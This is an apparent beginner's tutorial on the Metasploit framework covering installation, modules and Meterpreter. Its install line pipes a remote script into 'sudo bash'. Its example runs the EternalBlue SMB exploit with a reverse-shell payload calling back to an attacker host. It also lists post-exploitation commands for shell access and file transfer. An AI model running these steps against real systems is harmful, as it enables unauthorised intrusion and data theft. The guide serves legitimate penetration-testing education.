Metasploit Framework Complete Guide

What is Metasploit?

Metasploit is a powerful penetration testing framework used to discover, exploit, and validate vulnerabilities. It helps ethical hackers to test and secure systems.

Installation

Linux (Kali): Pre-installed

Manual:

curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfupdate | sudo bash

Basic Usage

msfconsole

This opens the main interface. You can search, configure, and launch exploits from here.

Understanding Modules

  • Exploit: Attacks a vulnerability
  • Payload: Code to run after exploitation
  • Auxiliary: Scanning, fuzzing, sniffing
  • Post: Run after successful exploitation

Launching an Exploit

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.5
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit

Using Meterpreter

  • sysinfo - Get target system info
  • shell - Launch command shell
  • screenshot - Capture screenshot
  • download / upload - File transfer

Tips & Safety

  • Only use Metasploit in test environments or with permission
  • Keep the framework updated
  • Combine with Nmap for reconnaissance
  • Use set VERBOSE true for more detail
